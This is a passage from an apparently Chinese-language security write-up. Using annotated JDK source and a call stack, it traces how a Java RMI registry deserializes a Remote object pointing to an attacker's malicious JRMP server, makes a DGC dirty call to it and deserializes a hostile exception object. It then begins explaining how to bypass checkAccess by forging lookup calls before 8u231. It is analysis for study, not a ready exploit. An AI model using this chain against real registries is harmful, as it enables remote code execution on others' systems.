&#123;<span class="doctag">@link</span> TCPEndpoint#read(ObjectInput)&#125;；</span></span><br><span class="line"><span class="comment"> *                      false ⇒ 使用 &#123;<span class="doctag">@link</span> TCPEndpoint#readHostPortFormat(ObjectInput)&#125;（旧格式）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  构造完成的 LiveRef</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException              I/O 错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException   反序列化需要的类不可用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title function_">read</span><span class="params">(ObjectInput in, <span class="type">boolean</span> useNewFormat)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    Endpoint ep;</span><br><span class="line">    ObjID id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 读取端点（Endpoint）。根据 useNewFormat 选择新/旧读取方式：</span></span><br><span class="line">    <span class="comment">//    - 新格式：TCPEndpoint.read(in)</span></span><br><span class="line">    <span class="comment">//    - 旧格式（JDK 1.1 风格 host:port）：TCPEndpoint.readHostPortFormat(in)</span></span><br><span class="line">    <span class="keyword">if</span> (useNewFormat) &#123;</span><br><span class="line">        ep = TCPEndpoint.read(in);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ep = TCPEndpoint.readHostPortFormat(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 读取远程对象标识（ObjID）</span></span><br><span class="line">    id = ObjID.read(in);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 读取是否为“结果流”的标志：</span></span><br><span class="line">    <span class="comment">//    若为 true，表示该流中曾解组过远程对象引用，传输层稍后需要发送 DGC ack。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isResultStream</span> <span class="operator">=</span> in.readBoolean();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基于端点与对象ID构造 LiveRef；第三个参数 false 表示作为“非本地”引用</span></span><br><span class="line">    <span class="type">LiveRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, ep, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果这是 RMI 传输层的 ConnectionInputStream：</span></span><br><span class="line">    <span class="keyword">if</span> (in <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">        <span class="type">ConnectionInputStream</span> <span class="variable">stream</span> <span class="operator">=</span> (ConnectionInputStream) in;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将本次读取到的 LiveRef 暂存到流内，等到“所有参数/返回值解组完成后”</span></span><br><span class="line">        <span class="comment">// 由 ConnectionInputStream#registerRefs() 统一批量发送 DGC.dirty</span></span><br><span class="line">        stream.saveRef(ref);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isResultStream) &#123;</span><br><span class="line">            <span class="comment">// 标记：该连接需要在传输层发送一次 DGC ack 确认</span></span><br><span class="line">            stream.setAckNeeded();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 非典型路径：若不是 ConnectionInputStream，则立刻为该端点注册引用</span></span><br><span class="line">        <span class="comment">// （立即触发 DGCClient.registerRefs → 发送 DGC.dirty）</span></span><br><span class="line">        DGCClient.registerRefs(ep, Arrays.asList(<span class="keyword">new</span> <span class="title class_">LiveRef</span>[] &#123; ref &#125;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>ConnectionInputStream#saveRef</code> 会将之前没有遇到的远程引用保存起来，具体是保存在 <code>incomingRefTable</code> 映射表中当前读取端点 <code>ep</code> 对应的列表 <code>refList</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将本次解组（unmarshal）过程中遇到的远程引用保存起来，</span></span><br><span class="line"><span class="comment"> * 以便在“所有参数/返回值都反序列化完成”之后，统一触发一次</span></span><br><span class="line"><span class="comment"> * DGC 的 dirty 调用（见 registerRefs）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;保存位置：incomingRefTable（哈希表）</span></span><br><span class="line"><span class="comment"> *   - Key：Endpoint（远端地址，如 TCPEndpoint：host:port）</span></span><br><span class="line"><span class="comment"> *   - Val：List&lt;LiveRef&gt;（该端点下出现的所有 LiveRef 引用）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;这样按端点分组，可以将多个 LiveRef 合批（batch）发送给 DGC，</span></span><br><span class="line"><span class="comment"> * 减少网络往返与系统调用次数。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">saveRef</span><span class="params">(LiveRef ref)</span> &#123;</span><br><span class="line">    <span class="comment">// 取出该引用所指向的远端端点（包含主机、端口等）</span></span><br><span class="line">    <span class="type">Endpoint</span> <span class="variable">ep</span> <span class="operator">=</span> ref.getEndpoint();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 按端点在表中查找对应的 LiveRef 列表</span></span><br><span class="line">    List&lt;LiveRef&gt; refList = incomingRefTable.get(ep);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首次遇到该端点：为其创建一个新的列表并放入表中</span></span><br><span class="line">    <span class="keyword">if</span> (refList == <span class="literal">null</span>) &#123;</span><br><span class="line">        refList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;LiveRef&gt;();</span><br><span class="line">        incomingRefTable.put(ep, refList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将本次读取到的 LiveRef 追加到该端点的列表中</span></span><br><span class="line">    <span class="comment">// （不做去重，由后续 DGC 层按需处理；合批由 registerRefs 统一完成）</span></span><br><span class="line">    refList.add(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>RegistryImpl_Skel#dispatch</code> 中每一个注册中心的远程调用分支在完成远程调用后都会执行一个 <code>call.releaseInputStream</code> 方法。</p>
<p><code>releaseInputStream()</code> 会在参数读完后<strong>关闭请求输入流</strong>，随后<strong>触发清理钩子</strong>（将已收集的 <code>LiveRef</code> 统一 <code>registerRefs()</code>，从而发起 <code>DGC.dirty</code>），最后<strong>把连接切换到“写返回值”模式</strong>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// bind(String, Remote)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Check access before reading the arguments</span></span><br><span class="line">    RegistryImpl.checkAccess(<span class="string">&quot;Registry.bind&quot;</span>);</span><br><span class="line"></span><br><span class="line">    java.lang.String $param_String_1;</span><br><span class="line">    java.rmi.Remote $param_Remote_2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        java.io.<span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line">        $param_String_1 = (java.lang.String) in.readObject();</span><br><span class="line">        $param_Remote_2 = (java.rmi.Remote) in.readObject(); <span class="comment">// 👈 触发反序列化</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.io.IOException | java.lang.ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        call.releaseInputStream(); <span class="comment">// 👈 进入 DGC 的 dirty 分支</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>前面在服务端反序列化 <code>Remote</code> 参数时，输入流会<strong>把遇到的 LiveRef 先存起来</strong>（<code>saveRef</code> → <code>incomingRefTable</code>，按 Endpoint 分组）。</p>
<p>当调用到 <code>releaseInputStream()</code>，输入流做收尾：<strong>把刚才收集到的 LiveRef 按端点合并后，一次性报备</strong>给对方的分布式 GC（DGC），相当于说“我这边现在持有这些远程对象，请先别回收”。</p>
<p>而<code>releaseInputStream</code> 调用的 <code>registerRefs</code> 会遍历前面添加终端节点和远程对象的 <code>incomingRefTable</code> 表，因此最终会遍历到我们设置指向恶意 JRMP 服务器的远程对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将在本次解组（unmarshal）过程中通过 &#123;<span class="doctag">@code</span> saveRef&#125; 累积的远程引用</span></span><br><span class="line"><span class="comment"> * 按端点（Endpoint）分组后，统一注册到 DGC（分布式垃圾回收）表中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现要点：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对同一 Endpoint 的所有 &#123;<span class="doctag">@code</span> LiveRef&#125; 批量提交给</span></span><br><span class="line"><span class="comment"> *       &#123;<span class="doctag">@link</span> DGCClient#registerRefs(Endpoint, java.util.List)&#125;，以减少</span></span><br><span class="line"><span class="comment"> *       与 DGC 的往返次数（batching）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;在 &#123;<span class="doctag">@code</span> DGCClient.registerRefs&#125; 内部会定位/创建该端点的</span></span><br><span class="line"><span class="comment"> *       EndpointEntry，并对该端点发起一次合并的 &#123;<span class="doctag">@code</span> DGC.dirty(ObjID[], Lease, VMID, ...)&#125; 调用。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 传输层在登记/发送 dirty 调用时发生 I/O 错误</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 若本次调用期间未收集到任何远程引用，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (!incomingRefTable.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// 按端点遍历，每个端点对应一个 LiveRef 列表</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry : incomingRefTable.entrySet()) &#123;</span><br><span class="line">            <span class="comment">// 将该端点的一批 LiveRef 统一注册（可能触发一次 batched 的 DGC.dirty 调用）</span></span><br><span class="line">            DGCClient.registerRefs(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此注册中心的 <code>DGCClient</code> 在 <code>DGCImpl_Stub#dirty</code> 过程中会去访问我们在远程对象设置的恶意 JRMP 服务器。该服务器接收到远端请求后会返回的一个异常对象，反序列化该异常对象则会触发反序列化利用链。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// implementation of dirty(ObjID[], long, Lease)</span></span><br><span class="line"><span class="keyword">public</span> java.rmi.dgc.Lease <span class="title function_">dirty</span><span class="params">(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, <span class="type">long</span> $param_long_2, java.rmi.dgc.Lease $param_Lease_3)</span></span><br><span class="line">        <span class="keyword">throws</span> java.rmi.RemoteException &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">        ref.invoke(call);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(RemoteCall call)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">        call.executeCall();</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span> returnType;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read result header</span></span><br><span class="line">    <span class="type">DGCAckHandler</span> <span class="variable">ackHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (out != <span class="literal">null</span>) &#123;</span><br><span class="line">            ackHandler = out.getDGCAckHandler();</span><br><span class="line">        &#125;</span><br><span class="line">        releaseOutputStream();</span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">rd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(conn.getInputStream());</span><br><span class="line">        <span class="type">byte</span> <span class="variable">op</span> <span class="operator">=</span> rd.readByte();</span><br><span class="line">        <span class="keyword">if</span> (op != TransportConstants.Return) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Transport.transportLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                Transport.transportLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;transport return code invalid: &quot;</span> + op);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Transport return code invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        getInputStream();</span><br><span class="line">        returnType = in.readByte();</span><br><span class="line">        in.readID();        <span class="comment">// id for DGC acknowledgement</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnmarshalException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return header&quot;</span>,</span><br><span class="line">                                     e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ackHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">            ackHandler.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read return value</span></span><br><span class="line">    <span class="keyword">switch</span> (returnType) &#123;</span><br><span class="line">    <span class="keyword">case</span> TransportConstants.NormalReturn:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">        Object ex;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ex = in.readObject();  <span class="comment">// 🚨 接收恶意序列化对象</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这一过程调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">at java.net.URLStreamHandler.getHostAddress(URLStreamHandler.java:440)</span><br><span class="line">at java.net.URLStreamHandler.hashCode(URLStreamHandler.java:361)</span><br><span class="line">at java.net.URL.hashCode(URL.java:957)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:339)</span><br><span class="line">at java.util.HashMap.readObject(HashMap.java:1462)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:564)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1160)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2207)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2078)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1585)</span><br><span class="line">at java.io.ObjectInputStream.access$300(ObjectInputStream.java:222)</span><br><span class="line">at java.io.ObjectInputStream$GetFieldImpl.readFields(ObjectInputStream.java:2525)</span><br><span class="line">at java.io.ObjectInputStream.readFields(ObjectInputStream.java:602)</span><br><span class="line">at javax.management.BadAttributeValueExpException.readObject(BadAttributeValueExpException.java:71)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:564)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1160)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2207)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2078)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1585)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:422)</span><br><span class="line">at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:252)</span><br><span class="line">at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:375)</span><br><span class="line">at sun.rmi.transport.DGCImpl_Stub.dirty(DGCImpl_Stub.java:109)</span><br><span class="line">at sun.rmi.transport.DGCClient$EndpointEntry.makeDirtyCall(DGCClient.java:377)</span><br><span class="line">at sun.rmi.transport.DGCClient$EndpointEntry.registerRefs(DGCClient.java:319)</span><br><span class="line">at sun.rmi.transport.DGCClient.registerRefs(DGCClient.java:155)</span><br><span class="line">at sun.rmi.transport.ConnectionInputStream.registerRefs(ConnectionInputStream.java:102)</span><br><span class="line">at sun.rmi.transport.StreamRemoteCall.releaseInputStream(StreamRemoteCall.java:157)</span><br><span class="line">at sun.rmi.registry.RegistryImpl_Skel.dispatch(RegistryImpl_Skel.java:80)</span><br><span class="line">at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:467)</span><br><span class="line">at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:297)</span><br><span class="line">at sun.rmi.transport.Transport$1.run(Transport.java:200)</span><br><span class="line">at sun.rmi.transport.Transport$1.run(Transport.java:197)</span><br><span class="line">at java.security.AccessController.doPrivileged(AccessController.java:-1)</span><br><span class="line">at sun.rmi.transport.Transport.serviceCall(Transport.java:196)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:567)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:800)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:682)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$36.1752546957.run(Unknown Source:-1)</span><br><span class="line">at java.security.AccessController.doPrivileged(AccessController.java:-1)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:681)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)</span><br><span class="line">at java.lang.Thread.run(Thread.java:844)</span><br></pre></td></tr></table></figure></div>

<h5 id="伪造-lookup-调用（8u231-前）"><a href="#伪造-lookup-调用（8u231-前）" class="headerlink" title="伪造 lookup 调用（8u231 前）"></a>伪造 lookup 调用（8u231 前）</h5><p>然而这个方法只能在本地成功，这是因为高版本 RMI 的 <code>RegistryImpl_Skel#dispatch</code> 在执行 <code>bind</code>、<code>rebind</code>、<code>unbind</code> 操作之前会判断客户端的 IP 和本机 IP 是否相同。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (opnum) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// bind(String, Remote)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Check access before reading the arguments</span></span><br><span class="line">        RegistryImpl.checkAccess(<span class="string">&quot;Registry.bind&quot;</span>);</span><br><span class="line">        <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<p>例如 <code>bind</code> 操作调用 <code>checkAccess</code> 进行了检测，这里传入的字符串参数仅是用于构造报错信息的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 校验调用端是否有权限执行指定操作（仅允许“与本 Registry 同一主机”的客户端）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;逻辑概览：</span></span><br><span class="line"><span class="comment"> * 1) 取出本次 Registry 操作的客户端主机名（RMI 运行时提供）。</span></span><br><span class="line"><span class="comment"> * 2) 将主机名解析为 InetAddress（在特权块中执行，以兼容安全管理器）。</span></span><br><span class="line"><span class="comment"> * 3) 若该地址未被允许缓存（allowedAccessCache）记录，则进一步校验：</span></span><br><span class="line"><span class="comment"> *    - 若为“任意本地地址”（0.0.0.0 / ::），视为来源不明 → 拒绝；</span></span><br><span class="line"><span class="comment"> *    - 尝试在该地址上绑定一个临时 ServerSocket：</span></span><br><span class="line"><span class="comment"> *        · 绑定成功 ⇒ 该地址必然属于本机网卡 ⇒ 允许，并写入缓存；</span></span><br><span class="line"><span class="comment"> *        · 绑定失败 ⇒ 说明不是本机地址 ⇒ 拒绝。</span></span><br><span class="line"><span class="comment"> * 4) 若当前线程不存在远程调用上下文（抛出 ServerNotActiveException），</span></span><br><span class="line"><span class="comment"> *    视为“本 JVM 的本地调用” ⇒ 直接允许。</span></span><br><span class="line"><span class="comment"> * 5) 主机名解析失败（UnknownHostException） ⇒ 拒绝。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> op 当前要执行的操作名（仅用于构造异常消息）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> AccessException 当判定为非本地主机、来源不明或主机未知时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkAccess</span><span class="params">(String op)</span> <span class="keyword">throws</span> 